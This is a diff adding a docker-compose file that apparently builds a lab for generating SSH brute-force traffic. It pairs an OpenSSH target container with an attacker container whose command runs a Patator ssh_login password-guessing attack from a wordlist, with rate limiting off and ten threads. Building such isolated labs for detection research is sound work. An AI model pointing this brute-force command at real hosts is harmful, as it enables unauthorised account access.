@@ -1,0 +1,25 @@
+services:
+  ssh_target:
+    build:
+      context: ../../containers/openssh
+      dockerfile: Dockerfile
+    container_name: ssh_target
+    ports:
+      - "22:22"
+    networks:
+      - ssh_network
+
+  ssh_attacker:
+    build:
+      context: ../../containers/ssh-patator
+      dockerfile: Dockerfile
+    container_name: ssh_attacker
+    depends_on:
+      - ssh_target
+    networks:
+      - ssh_network
+    command: "ssh_login host=ssh_target user=iscxtap password=FILE0 0=passwords.txt --rate-limit=0 --threads=10"
+
+networks:
+  ssh_network:
+    driver: bridge
